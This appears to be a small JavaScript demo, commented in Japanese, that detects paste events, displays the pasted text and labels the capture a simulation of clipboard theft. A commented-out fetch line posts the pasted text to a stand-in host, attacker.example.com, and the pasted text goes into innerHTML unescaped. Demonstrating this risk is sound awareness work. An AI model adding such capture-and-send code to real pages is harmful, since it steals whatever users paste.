// sniff.js - pasteイベントスニッフィング処理

window.addEventListener("DOMContentLoaded", () => {
  const sniffInput = document.getElementById("sniffInput");
  const sniffLog = document.getElementById("sniffLog");

  sniffInput.addEventListener("paste", (event) => {
    // クリップボードから貼り付けられたテキストを取得
    const pastedText = event.clipboardData.getData("text");

    // 可視化ログに表示
    sniffLog.innerHTML = `
      ✅ ペースト操作が検知されました。<br><br>
      📋 貼り付けられた内容：<br>
      <code>${pastedText}</code><br><br>
      📤 この内容は外部に送信された可能性があります（シミュレーション）。
    `;

    // 攻撃シミュレーション（送信処理は行わないが、実際は fetch() など）
    console.log("Sniffed paste content:", pastedText);
    // fetch("https://attacker.example.com/leak", { method: "POST", body: pastedText });
  });
});
